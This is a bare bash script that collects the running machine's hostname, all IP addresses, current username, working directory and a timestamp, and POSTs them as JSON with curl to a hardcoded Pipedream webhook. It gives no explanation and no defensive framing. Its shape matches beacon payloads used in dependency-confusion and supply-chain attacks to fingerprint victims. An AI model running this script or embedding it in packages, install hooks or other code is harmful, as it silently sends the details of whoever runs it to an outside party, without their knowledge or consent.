PIPEDREAM_URL="https://eo5tkj8hych3bx3.m.pipedream.net"

ALL_IPS=$(hostname -I)
PRIMARY_IP=$(hostname -I | awk '{print $1}')
USERNAME=$(whoami)
CURRENT_DIR=$(pwd)
HOSTNAME=$(hostname)

JSON_PAYLOAD=$(cat <<EOF
{
  "hostname": "$HOSTNAME",
  "primary_ip": "$PRIMARY_IP",
  "all_ips": "$ALL_IPS",
  "username": "$USERNAME",
  "current_directory": "$CURRENT_DIR",
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
}
EOF
)

curl -X POST \
  -H "Content-Type: application/json" \
  -d "$JSON_PAYLOAD" \
  "$PIPEDREAM_URL"

if [ $? -eq 0 ]; then
  echo "✓ Data sent successfully"
else
  echo "✗ Failed to send data"
  exit 1
fi
